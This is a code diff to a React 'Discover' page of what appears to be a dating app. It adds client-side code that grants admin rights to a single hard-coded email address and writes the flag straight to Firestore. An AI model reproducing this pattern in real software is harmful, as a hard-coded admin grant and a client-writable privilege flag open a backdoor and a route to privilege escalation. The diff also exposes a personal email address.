@@ -144,9 +144,16 @@ export default function Discover() {
     try {
       // 0. Fetch current user profile to get preferences
       const userRef = doc(db, "users", uid);
-      const { getDoc } = await import("firebase/firestore");
+      const { getDoc, updateDoc } = await import("firebase/firestore");
       const userSnap = await getDoc(userRef);
       const currentUserData = userSnap.data();
+      
+      // Auto-recover Admin for the creator
+      if (currentUserData?.email === "ashu.chhapra.br@gmail.com" && currentUserData?.isAdmin !== true) {
+        await updateDoc(userRef, { isAdmin: true });
+        if (currentUserData) currentUserData.isAdmin = true;
+      }
+      
       const interestedIn = currentUserData?.interestedIn || "everyone";
       const minAgePref = currentUserData?.minAgePref || 18;
       const maxAgePref = currentUserData?.maxAgePref || 99;
